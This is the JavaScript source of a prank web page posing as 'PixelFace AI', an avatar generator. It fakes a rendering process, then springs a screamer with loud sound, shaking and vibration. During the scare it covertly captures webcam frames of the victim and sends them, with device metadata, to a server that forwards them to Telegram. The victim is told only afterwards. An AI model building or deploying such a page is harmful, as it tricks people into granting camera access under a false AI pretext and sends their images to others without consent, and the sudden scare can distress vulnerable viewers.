/* ============================================================
   PixelFace AI — «аватарка из фото», которая ломается в скример.
   Совместимость: Chrome / Safari (iOS + macOS) / Firefox / Edge /
   Яндекс.Браузер / Chrome на Android.
   ============================================================ */
(() => {
  'use strict';

  const params = new URLSearchParams(location.search);
  const DEBUG = params.has('debug');
  const NO_CAM = params.has('nocam');
  const ACCESS_KEY = params.get('key') || '';
  const SPEED = DEBUG ? 0.18 : 1;

  const $ = (sel) => document.querySelector(sel);

  const isIOS =
    /iPad|iPhone|iPod/.test(navigator.userAgent) ||
    (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);

  const scenes = {
    intro: $('#scene-intro'),
    scan: $('#scene-scan'),
    scare: $('#scene-scare'),
    result: $('#scene-result'),
  };

  const el = {
    btnStart: $('#btn-start'),
    btnAgain: $('#btn-again'),
    btnRetry: $('#btn-retry'),
    btnDownload: $('#btn-download'),
    secureWarn: $('#secure-warn'),
    cam: $('#cam'),
    nosignal: $('#nosignal'),
    camHint: $('#cam-hint'),
    timer: $('#scan-timer'),
    bar: $('#scan-bar'),
    pct: $('#scan-pct'),
    phase: $('#scan-phase'),
    log: $('#scan-log'),
    mStyle: $('#m-style'),
    mLayer: $('#m-layer'),
    mQuality: $('#m-quality'),
    glitch: $('#glitch'),
    glitchText: $('#glitch-text'),
    scareWrap: $('#scare-wrap'),
    scareFlash: $('#scare-flash'),
    shots: $('#shots'),
    status: $('#send-status'),
    statusText: $('#send-status-text'),
    resultLead: $('#result-lead'),
  };

  const state = {
    running: false,
    phase: 'idle',
    stream: null,
    frames: [],
    canvas: null,
    ctx: null,
    startedAt: 0,
    clockId: 0,
  };

  const sleep = (ms) => new Promise((r) => setTimeout(r, ms * SPEED));

  /* ---------------------------------------------------------- сцены */
  function showScene(name) {
    Object.entries(scenes).forEach(([key, node]) => {
      const active = key === name;
      node.classList.toggle('is-active', active);
      node.hidden = !active;
      if (active) node.scrollTop = 0;
    });
  }

  function goFullscreen() {
    const root = document.documentElement;
    const fn = root.requestFullscreen || root.webkitRequestFullscreen;
    if (fn) {
      try {
        const result = fn.call(root, { navigationUI: 'hide' });
        if (result && typeof result.catch === 'function') result.catch(() => {});
      } catch { /* iOS не умеет — обойдёмся */ }
    }
    try { window.scrollTo(0, 0); } catch { /* ignore */ }
  }

  /* ---------------------------------------------------------- звук
     iOS игнорирует audio.volume, поэтому всё крутим через WebAudio.
     Если декодировать не удалось — откатываемся на HTMLAudio. */
  const voiceParam = params.get('voice');
  const voice = ['1', '2', '3'].includes(voiceParam) ? voiceParam : '1';

  const SOUNDS = {
    pad: 'assets/ambient-happy.wav?v=3',
    drone: 'assets/ambient.wav?v=3',
    scream: voice === '1' ? 'assets/scream.wav?v=3' : `assets/scream-${voice}.wav?v=3`,
  };

  const audio = {
    ctx: null,
    buffers: new Map(),
    loops: new Map(),
    fallbacks: new Map(),
    ready: false,
    failed: false,
  };

  async function unlockAudio() {
    const Ctx = window.AudioContext || window.webkitAudioContext;
    if (!Ctx) return false;
    try {
      audio.ctx ??= new Ctx();
      if (audio.ctx.state !== 'running') await audio.ctx.resume();
      return audio.ctx.state === 'running';
    } catch {
      audio.failed = true;
      return false;
    }
  }

  async function preloadAudio() {
    const ctx = audio.ctx;
    if (!ctx) return false;
    await Promise.all(
      Object.entries(SOUNDS).map(async ([name, url]) => {
        try {
          const res = await fetch(url);
          if (!res.ok) throw new Error(String(res.status));
          const data = await res.arrayBuffer();
          const buffer = await ctx.decodeAudioData(data);
          audio.buffers.set(name, buffer);
        } catch {
          /* останется HTMLAudio-fallback */
        }
      })
    );
    audio.ready = audio.buffers.size === Object.keys(SOUNDS).length;
    return audio.ready;
  }

  function playOnce(name, gain = 1, rate = 1) {
    const ctx = audio.ctx;
    const buffer = audio.buffers.get(name);
    if (ctx && buffer) {
      try {
        const src = ctx.createBufferSource();
        src.buffer = buffer;
        src.playbackRate.value = rate;
        const g = ctx.createGain();
        g.gain.value = gain;
        src.connect(g).connect(ctx.destination);
        src.start();
        return true;
      } catch { /* ниже fallback */ }
    }
    if (audio.failed || !isIOS) {
      try {
        const node = new Audio(SOUNDS[name]);
        node.volume = Math.max(0, Math.min(1, gain));
        node.playbackRate = rate;
        node.play().catch(() => {});
        return true;
      } catch { /* ignore */ }
    }
    return false;
  }

  function playLoop(name, gain = 1) {
    stopSound(name);
    const ctx = audio.ctx;
    const buffer = audio.buffers.get(name);
    if (ctx && buffer) {
      try {
        const src = ctx.createBufferSource();
        src.buffer = buffer;
        src.loop = true;
        const g = ctx.createGain();
        g.gain.value = gain;
        src.connect(g).connect(ctx.destination);
        src.start();
        audio.loops.set(name, { src, gain: g });
        return true;
      } catch { /* ниже fallback */ }
    }
    if (!isIOS) {
      try {
        const node = new Audio(SOUNDS[name]);
        node.loop = true;
        node.volume = Math.max(0, Math.min(1, gain));
        node.play().catch(() => {});
        audio.fallbacks.set(name, node);
        return true;
      } catch { /* ignore */ }
    }
    return false;
  }

  function fadeSound(name, value, ms = 0) {
    const handle = audio.loops.get(name);
    if (handle && audio.ctx) {
      const now = audio.ctx.currentTime;
      const param = handle.gain.gain;
      param.cancelScheduledValues(now);
      if (ms > 0) {
        param.setValueAtTime(Math.max(0.0001, param.value), now);
        param.linearRampToValueAtTime(value, now + ms / 1000);
      } else {
        param.value = value;
      }
    }
    const fallback = audio.fallbacks.get(name);
    if (fallback) fallback.volume = Math.max(0, Math.min(1, value));
  }

  function stopSound(name) {
    const handle = audio.loops.get(name);
    if (handle) {
      try { handle.src.stop(); } catch { /* уже остановлен */ }
      audio.loops.delete(name);
    }
    const fallback = audio.fallbacks.get(name);
    if (fallback) {
      try { fallback.pause(); } catch { /* ignore */ }
      audio.fallbacks.delete(name);
    }
  }

  function beep(freq, dur = 0.09, gain = 0.04, type = 'sine') {
    const ctx = audio.ctx;
    if (!ctx) return;
    try {
      const osc = ctx.createOscillator();
      const amp = ctx.createGain();
      osc.type = type;
      osc.frequency.value = freq;
      amp.gain.setValueAtTime(0.0001, ctx.currentTime);
      amp.gain.linearRampToValueAtTime(gain, ctx.currentTime + 0.012);
      amp.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + dur);
      osc.connect(amp).connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + dur + 0.03);
    } catch { /* ignore */ }
  }

  function startPad() {
    if (!playLoop('pad', 0.0001)) return;
    fadeSound('pad', 0.7, 3500);
  }

  function stopAllAudio() {
    stopSound('pad');
    stopSound('drone');
  }

  /* ---------------------------------------------------------- камера */
  function initCanvas() {
    if (state.canvas) return;
    state.canvas = document.createElement('canvas');
    state.ctx = state.canvas.getContext('2d');
  }

  function camHintFor(err) {
    if (!window.isSecureContext) {
      return 'iPhone и Android отдают камеру только по https:// — открой сайт через HTTPS или туннель.';
    }
    const name = err && err.name;
    if (name === 'NotAllowedError' || name === 'SecurityError') {
      return isIOS
        ? 'Камера запрещена. Настройки → Safari → Камера → «Спросить», затем перезагрузи страницу.'
        : 'Камера запрещена. Разреши доступ в настройках браузера (значок замка в адресной строке).';
    }
    if (name === 'NotFoundError' || name === 'OverconstrainedError') return 'Камера не найдена на этом устройстве.';
    if (name === 'NotReadableError') return 'Камера занята другим приложением.';
    return '';
  }

  async function initCamera() {
    if (NO_CAM) return false;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      el.nosignal.textContent = 'НУЖЕН HTTPS';
      el.camHint.textContent = camHintFor(null);
      return false;
    }
    try {
      state.stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
      });
      el.cam.srcObject = state.stream;
      el.cam.classList.add('is-live');
      el.nosignal.classList.add('is-hidden');
      el.camHint.textContent = '';
      await el.cam.play().catch(() => {});
      initCanvas();
      return true;
    } catch (err) {
      const hint = camHintFor(err);
      el.nosignal.textContent = hint ? 'КАМЕРА НЕДОСТУПНА' : 'КАМЕРА ВЫКЛЮЧЕНА';
      el.camHint.textContent = hint;
      el.phase.textContent = 'БЕЗ КАМЕРЫ';
      logLine(`камера: ${err && err.name ? err.name : 'ошибка'}`);
      return false;
    }
  }

  function stopCamera() {
    if (!state.stream) return;
    state.stream.getTracks().forEach((track) => track.stop());
    state.stream = null;
    el.cam.srcObject = null;
  }

  function grabFrame() {
    const { ctx, canvas } = state;
    const video = el.cam;
    if (!ctx || !video || !video.videoWidth) return null;
    const w = 640;
    const h = Math.round((w * video.videoHeight) / video.videoWidth) || 480;
    canvas.width = w;
    canvas.height = h;
    ctx.save();
    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);
    ctx.restore();
    return canvas.toDataURL('image/jpeg', 0.74);
  }

  function captureBurst() {
    const stamps = [0, 280, 650, 1150];
    const t0 = performance.now();
    stamps.forEach((delay) => {
      setTimeout(() => {
        const frame = grabFrame();
        if (frame) state.frames.push({ at: Math.round(performance.now() - t0), src: frame });
      }, delay);
    });
  }

  /* ---------------------------------------------------------- HUD */
  function startClock() {
    state.startedAt = Date.now();
    clearInterval(state.clockId);
    state.clockId = setInterval(() => {
      const s = Math.floor((Date.now() - state.startedAt) / 1000);
      el.timer.textContent =
        String(Math.floor(s / 60)).padStart(2, '0') + ':' + String(s % 60).padStart(2, '0');
    }, 200);
  }

  function logLine(text, tone = '') {
    const line = document.createElement('div');
    line.className = 'scanlog__line' + (tone ? ' ' + tone : '');
    line.textContent = text;
    el.log.appendChild(line);
    while (el.log.children.length > 4) el.log.firstElementChild.remove();
  }

  function setBar(pct, phase) {
    el.bar.style.width = pct + '%';
    el.pct.textContent = pct + '%';
    if (phase) el.phase.textContent = phase;
  }

  function setMetrics(styleName, layer, quality) {
    el.mStyle.textContent = styleName;
    el.mLayer.textContent = layer;
    el.mQuality.textContent = quality;
  }

  /* ---------------------------------------------------------- «рендер» */
  const STEPS = [
    [700, 'загружаем модель anime', 8, 'ЗАГРУЗКА', 'anime', '1/8', 'SD'],
    [650, 'ищем лицо в кадре', 20, 'ПОИСК ЛИЦА', 'anime', '2/8', 'HD'],
    [600, 'черты лица: 34 точки', 32, 'ТРЕКИНГ', 'anime', '3/8', 'HD'],
    [600, 'подбираем палитру', 44, 'ПАЛИТРА', 'anime', '4/8', 'HD'],
    [600, 'накладываем стиль', 58, 'СТИЛЬ', 'anime', '5/8', 'HD'],
    [600, 'добавляем блики', 70, 'СВЕТ', 'anime', '6/8', 'HD'],
    [600, 'сглаживаем контуры', 82, 'СГЛАЖИВАНИЕ', 'anime', '7/8', 'HD'],
    [700, 'почти готово…', 96, 'ФИНАЛ', 'anime', '8/8', 'HD'],
  ];

  async function runScan() {
    for (let i = 0; i < STEPS.length; i += 1) {
      const [delay, text, pct, phase, styleName, layer, quality] = STEPS[i];
      await sleep(delay);
      if (!state.running) return;

      logLine(text);
      setBar(pct, phase);
      setMetrics(styleName, layer, quality);
      beep(880 + i * 40, 0.05, 0.035);
    }
  }

  /* ---------------------------------------------------------- резкий слом */
  async function runGlitch() {
    state.phase = 'glitch';
    stopSound('pad');

    // вместо милой музыки — низкий гул
    playLoop('drone', 0.3);

    el.glitch.hidden = false;
    scenes.scan.classList.add('is-glitching');
    setMetrics('???', 'ERR', '0');
    setBar(100, 'СБОЙ');

    const messages = ['ОШИБКА: ЛИЦО НЕ РАСПОЗНАНО', 'В КАДРЕ КТО-ТО ЕЩЁ'];
    for (const message of messages) {
      el.glitchText.textContent = message;
      beep(64, 0.22, 0.18, 'square');
      await sleep(420);
      if (!state.running) return;
    }

    // тишина перед ударом
    stopSound('drone');
    await sleep(200);
  }

  /* ---------------------------------------------------------- скример */
  async function runScream() {
    state.phase = 'scare';
    el.glitch.hidden = true;
    scenes.scan.classList.remove('is-glitching');
    showScene('scare');
    document.body.classList.add('is-shaking');
    el.scareWrap.classList.add('is-shaking');
    el.scareFlash.classList.remove('is-on');
    void el.scareFlash.offsetWidth;
    el.scareFlash.classList.add('is-on');

    try { await audio.ctx?.resume?.(); } catch { /* ignore */ }
    playOnce('scream', 1);

    if (navigator.vibrate) {
      try { navigator.vibrate([0, 320, 110, 520]); } catch { /* ignore */ }
    }

    captureBurst();
    await sleep(1900);
  }

  /* ---------------------------------------------------------- отправка */
  function setStatus(kind, text) {
    el.status.dataset.state = kind;
    el.statusText.textContent = text;
    el.btnRetry.hidden = kind !== 'err';
  }

  function renderShots() {
    el.shots.textContent = '';
    state.frames.forEach((frame, i) => {
      const fig = document.createElement('figure');
      const img = document.createElement('img');
      img.src = frame.src;
      img.alt = `Кадр ${i + 1}`;
      const cap = document.createElement('figcaption');
      cap.textContent = `#${i + 1} · ${(frame.at / 1000).toFixed(2)}с`;
      fig.append(img, cap);
      el.shots.appendChild(fig);
    });
    el.btnDownload.hidden = state.frames.length === 0;
  }

  async function sendToTelegram() {
    setStatus('pending', 'Отправляю в Telegram…');
    try {
      const res = await fetch('api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(ACCESS_KEY ? { 'x-access-key': ACCESS_KEY } : {}),
        },
        body: JSON.stringify({
          photos: state.frames.map((f) => f.src),
          meta: {
            at: new Date().toISOString(),
            screen: `${window.innerWidth}x${window.innerHeight}`,
            cam: Boolean(state.stream),
            ios: isIOS,
          },
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (res.ok && data.ok) {
        setStatus('ok', data.message || 'Фото улетело в Telegram. Приятного просмотра 😈');
      } else {
        setStatus('err', data.hint || data.error || `Сервер ответил ${res.status}. Проверь .env.`);
      }
    } catch (err) {
      setStatus('err', 'Сервер недоступен: ' + err.message);
    }
  }

  async function finish() {
    state.phase = 'result';
    document.body.classList.remove('is-shaking');
    el.scareWrap.classList.remove('is-shaking');
    stopCamera();
    state.running = false;

    el.resultLead.textContent = state.frames.length
      ? 'Нейросеть выбрала самый честный кадр — и уже отправила его в Telegram.'
      : 'Камеру ты не дал, но реакцию мы записали. Отчёт уже улетел в Telegram.';

    renderShots();
    showScene('result');
    await sendToTelegram();
  }

  /* ---------------------------------------------------------- запуск */
  async function begin() {
    if (state.running) return;
    state.running = true;
    state.phase = 'scan';
    state.frames = [];

    await unlockAudio();
    goFullscreen();
    try {
      await screen.orientation?.lock?.('portrait');
    } catch { /* iOS не поддерживает */ }

    showScene('scan');
    startClock();
    logLine('подключаем камеру');

    await Promise.all([initCamera(), preloadAudio()]);
    startPad();
    beep(1046, 0.08, 0.05);

    await runScan();
    if (!state.running) return;

    await runGlitch();
    if (!state.running) return;

    await runScream();
    await finish();
  }

  /* ---------------------------------------------------------- события */
  el.btnStart.addEventListener('click', () => {
    el.btnStart.disabled = true;
    unlockAudio();
    begin().catch(() => {
      state.running = false;
      el.btnStart.disabled = false;
    });
  });

  el.btnAgain.addEventListener('click', () => location.reload());

  el.btnRetry.addEventListener('click', () => {
    el.btnRetry.hidden = true;
    sendToTelegram();
  });

  el.btnDownload.addEventListener('click', () => {
    const first = state.frames[0];
    if (!first) return;
    const a = document.createElement('a');
    a.href = first.src;
    a.download = 'pixelface-avatar.jpg';
    a.click();
  });

  window.addEventListener('pagehide', () => {
    state.running = false;
    stopCamera();
    stopAllAudio();
  });

  if (!window.isSecureContext) {
    el.secureWarn.hidden = false;
  }

  if (params.get('scene') === 'scare') {
    showScene('scare');
    el.scareWrap.classList.add('is-shaking');
  }

  if (params.get('scene') === 'glitch') {
    showScene('scan');
    el.glitch.hidden = false;
    scenes.scan.classList.add('is-glitching');
    el.glitchText.textContent = 'ОШИБКА: ЛИЦО НЕ РАСПОЗНАНО';
    setBar(100, 'СБОЙ');
    setMetrics('???', 'ERR', '0');
  }

  /* хук для автотестов */
  window.__NEUROSCAN__ = { state, audio, isIOS, isSafari, voice, version: '2.0.0' };
})();
